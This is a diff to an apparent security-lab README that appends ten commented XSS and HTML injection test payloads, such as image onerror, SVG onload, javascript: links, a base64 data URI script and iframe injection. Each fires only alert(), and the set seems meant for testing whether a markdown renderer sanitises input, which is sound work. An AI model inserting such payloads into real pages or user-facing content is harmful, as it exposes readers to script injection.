@@ -112,3 +112,35 @@ A practical lab for AD security testing and defense demonstrations.
 
 <!-- Using href with javascript -->
 [test](javascript:alert('XSS'))
+
+<!-- ===== XSS / HTML Injection Test Payloads ===== -->
+
+<!-- 1. Classic image onerror -->
+<img src="x" onerror="alert('XSS-1')">
+
+<!-- 2. SVG with onload -->
+<svg onload="alert('XSS-2')"></svg>
+
+<!-- 3. JavaScript protocol in link -->
+[Click me](javascript:alert('XSS-3'))
+
+<!-- 4. Data URI with base64-encoded script -->
+[Click me](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTLTQnKTwvc2NyaXB0Pg==)
+
+<!-- 5. Inline iframe -->
+<iframe src="javascript:alert('XSS-5')"></iframe>
+
+<!-- 6. Body onload -->
+<body onload="alert('XSS-6')">
+
+<!-- 7. MathML click event -->
+<math><mi onclick="alert('XSS-7')">X</mi></math>
+
+<!-- 8. Markdown image with onerror (in alt/title) -->
+![alt](x "onerror=alert('XSS-8')")
+
+<!-- 9. Link with onmouseover via title attribute -->
+[Hover me](https://example.com "onmouseover=alert('XSS-9')")
+
+<!-- 10. Another javascript protocol variant -->
+[Test](javascript:alert('XSS-10'))
